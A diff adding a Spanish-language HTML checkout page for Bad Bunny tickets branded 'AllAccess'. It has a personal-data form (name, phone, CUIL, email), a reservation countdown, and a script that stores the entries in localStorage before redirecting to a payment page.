@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AllAccess - Bad Bunny - Datos Personales</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+        }
+
+        /* NAVBAR FIJA */
+        .navbar {
+            background: #000;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 2000;
+            box-sizing: border-box;
+        }
+
+        .navbar .logo {
+            cursor: pointer;
+        }
+
+        .navbar .logo img {
+            height: 25px;
+        }
+
+        .navbar-right {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .timer-display {
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .menu-icon {
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        /* MENÚ LATERAL */
+        .menu-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            z-index: 2001;
+        }
+
+        .menu-overlay.active {
+            display: block;
+        }
+
+        .menu-sidebar {
+            position: fixed;
+            top: 0;
+            right: -300px;
+            width: 300px;
+            height: 100%;
+            background: white;
+            box-shadow: -2px 0 10px rgba(0, 0, 0, 0.1);
+            transition: right 0.3s ease;
+            z-index: 2002;
+            overflow-y: auto;
+        }
+
+        .menu-sidebar.active {
+            right: 0;
+        }
+
+        .menu-header {
+            padding: 20px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .menu-close {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        .menu-items {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .menu-item {
+            padding: 15px 20px;
+            text-decoration: none;
+            color: #333;
+            border-bottom: 1px solid #eee;
+            font-size: 14px;
+        }
+
+        .menu-item:hover {
+            background: #f9f9f9;
+        }
+
+        /* CONTENEDOR PRINCIPAL */
+        .content-wrapper {
+            margin-top: 60px;
+            min-height: calc(100vh - 60px);
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 40px 20px;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 600px;
+        }
+
+        .page-title {
+            font-size: 28px;
+            color: #000;
+            margin-bottom: 30px;
+            font-weight: 700;
+        }
+
+        /* FORMULARIO DATOS PERSONALES */
+        .data-container {
+            background: white;
+            border-radius: 12px;
+            padding: 30px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-intro {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+
+        .personal-data-form {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group:nth-child(4),
+        .form-group:nth-child(5) {
+            grid-column: span 1;
+        }
+
+        .form-group label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
+
+        .form-group input {
+            padding: 10px 12px;
+            border: 1px solid #d0deff;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: 'Inter', sans-serif;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #7c00e2;
+            box-shadow: 0 0 0 3px rgba(124, 0, 226, 0.1);
+        }
+
+        .form-group input:invalid:not(:placeholder-shown) {
+            border-color: #ff6b6b;
+        }
+
+        /* BOTONES */
+        .btn-container {
+            display: flex;
+            gap: 10px;
+            margin-top: 25px;
+        }
+
+        .btn-back {
+            flex: 1;
+            padding: 12px 20px;
+            background: #f0f0f0;
+            color: #333;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn-back:hover {
+            background: #e0e0e0;
+        }
+
+        .btn-continue {
+            flex: 1;
+            padding: 12px 20px;
+            background: #7c00e2;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn-continue:hover {
+            background: #6a00cc;
+        }
+
+        .btn-continue:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .error-message {
+            color: #ff6b6b;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        @media (max-width: 768px) {
+            .content-wrapper {
+                padding: 30px 15px;
+            }
+
+            .data-container {
+                padding: 20px;
+            }
+
+            .page-title {
+                font-size: 22px;
+            }
+
+            .personal-data-form {
+                grid-template-columns: 1fr;
+            }
+
+            .form-group:nth-child(4),
+            .form-group:nth-child(5) {
+                grid-column: span 1;
+            }
+
+            .btn-container {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <nav class="navbar">
+        <div class="logo" onclick="window.location.href='index.html'" style="cursor: pointer;"><img src="images/allaccess-clear.png" alt="AllAccess"></div>
+        <div class="navbar-right">
+            <div class="timer-display">La reserva expira en <span id="timer">03:00</span></div>
+            <div class="menu-icon" onclick="toggleMenu()" style="cursor: pointer;">☰</div>
+        </div>
+    </nav>
+
+    <!-- MENÚ LATERAL -->
+    <div class="menu-overlay" id="menuOverlay" onclick="closeMenu()"></div>
+    <div class="menu-sidebar" id="menuSidebar">
+        <div class="menu-header">
+            <h3>Menú</h3>
+            <button class="menu-close" onclick="closeMenu()">×</button>
+        </div>
+        <div class="menu-items">
+            <a href="my-entries.html" class="menu-item">Mis entradas</a>
+            <a href="index.html" class="menu-item">Inicio</a>
+        </div>
+    </div>
+
+    <div class="content-wrapper">
+        <div class="main-container">
+            <h1 class="page-title">Completa tus datos</h1>
+
+            <div class="data-container">
+                <div class="form-intro">
+                    Necesitamos tu información para procesar tu compra de forma segura.
+                </div>
+
+                <form id="personalDataForm" class="personal-data-form">
+                    <div class="form-group">
+                        <label for="nombre">Nombre *</label>
+                        <input type="text" id="nombre" name="nombre" placeholder="Tu nombre" required>
+                        <div class="error-message" data-field="nombre">Por favor completa este campo</div>
+                    </div>
+                    <div class="form-group">
+                        <label for="apellido">Apellido *</label>
+                        <input type="text" id="apellido" name="apellido" placeholder="Tu apellido" required>
+                        <div class="error-message" data-field="apellido">Por favor completa este campo</div>
+                    </div>
+                    <div class="form-group">
+                        <label for="numero">Número de teléfono *</label>
+                        <input type="tel" id="numero" name="numero" placeholder="Tu número de teléfono" required>
+                        <div class="error-message" data-field="numero">Por favor completa este campo</div>
+                    </div>
+                    <div class="form-group">
+                        <label for="cuil">CUIL *</label>
+                        <input type="text" id="cuil" name="cuil" placeholder="Tu CUIL sin guiones" required>
+                        <div class="error-message" data-field="cuil">Por favor completa este campo</div>
+                    </div>
+                    <div class="form-group">
+                        <label for="email">Gmail *</label>
+                        <input type="email" id="email" name="email" placeholder="Tu correo electrónico" required>
+                        <div class="error-message" data-field="email">Por favor ingresa un email válido</div>
+                    </div>
+                </form>
+
+                <div class="btn-container">
+                    <button class="btn-back" onclick="goBack()">Atrás</button>
+                    <button class="btn-continue" onclick="continueToPayment()">Continuar</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Timer
+        let timeLeft = 3 * 60;
+        
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            document.getElementById('timer').textContent = 
+                String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+            }
+        }
+
+        setInterval(updateTimer, 1000);
+        updateTimer();
+
+        // Menú
+        function toggleMenu() {
+            const overlay = document.getElementById('menuOverlay');
+            const sidebar = document.getElementById('menuSidebar');
+            
+            overlay.classList.toggle('active');
+            sidebar.classList.toggle('active');
+        }
+
+        function closeMenu() {
+            const overlay = document.getElementById('menuOverlay');
+            const sidebar = document.getElementById('menuSidebar');
+            
+            overlay.classList.remove('active');
+            sidebar.classList.remove('active');
+        }
+
+        // Manejo del formulario
+        function validateForm() {
+            const form = document.getElementById('personalDataForm');
+            const inputs = form.querySelectorAll('input');
+            let isValid = true;
+
+            inputs.forEach(input => {
+                const errorMsg = form.querySelector(`.error-message[data-field="${input.name}"]`);
+                
+                if (!input.value.trim()) {
+                    input.style.borderColor = '#ff6b6b';
+                    if (errorMsg) errorMsg.classList.add('show');
+                    isValid = false;
+                } else if (input.type === 'email' && !input.value.includes('@')) {
+                    input.style.borderColor = '#ff6b6b';
+                    if (errorMsg) errorMsg.classList.add('show');
+                    isValid = false;
+                } else {
+                    input.style.borderColor = '#d0deff';
+                    if (errorMsg) errorMsg.classList.remove('show');
+                }
+            });
+
+            return isValid;
+        }
+
+        function continueToPayment() {
+            if (validateForm()) {
+                // Guardar datos en localStorage
+                const formData = {
+                    nombre: document.getElementById('nombre').value,
+                    apellido: document.getElementById('apellido').value,
+                    numero: document.getElementById('numero').value,
+                    cuil: document.getElementById('cuil').value,
+                    email: document.getElementById('email').value
+                };
+
+                localStorage.setItem('personalData', JSON.stringify(formData));
+
+                // Obtener método de pago de la URL
+                const params = new URLSearchParams(window.location.search);
+                const method = params.get('method') || 'wallet';
+
+                // Redirigir a payment.html directamente
+                window.location.href = 'payment.html';
+            }
+        }
+
+        function goBack() {
+            // Volver a checkout.html
+            window.location.href = 'checkout.html';
+        }
+
+        // Limpiar errores cuando el usuario empieza a escribir
+        document.getElementById('personalDataForm').querySelectorAll('input').forEach(input => {
+            input.addEventListener('input', function() {
+                this.style.borderColor = '#d0deff';
+                const errorMsg = document.querySelector(`.error-message[data-field="${this.name}"]`);
+                if (errorMsg) errorMsg.classList.remove('show');
+            });
+        });
+    </script>
+</body>
+</html>
